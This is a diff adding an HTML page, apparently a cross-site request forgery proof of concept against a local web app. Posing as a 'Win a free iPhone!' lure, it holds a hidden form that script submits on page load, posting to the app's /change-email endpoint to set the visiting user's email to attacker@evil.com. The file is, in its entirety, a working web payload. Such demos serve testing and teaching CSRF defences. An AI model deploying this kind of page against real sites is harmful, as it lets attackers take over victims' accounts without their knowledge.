@@ -1,0 +1,15 @@
+<!doctype html>
+<html>
+<body>
+  <h1>Win a free iPhone!</h1>
+  <p>Just a normal, harmless page.</p>
+
+  <form id="evil" method="POST" action="http://127.0.0.1:5000/change-email">
+    <input name="email" value="attacker@evil.com">
+  </form>
+
+  <script>
+    document.getElementById("evil").submit();
+  </script>
+</body>
+</html>
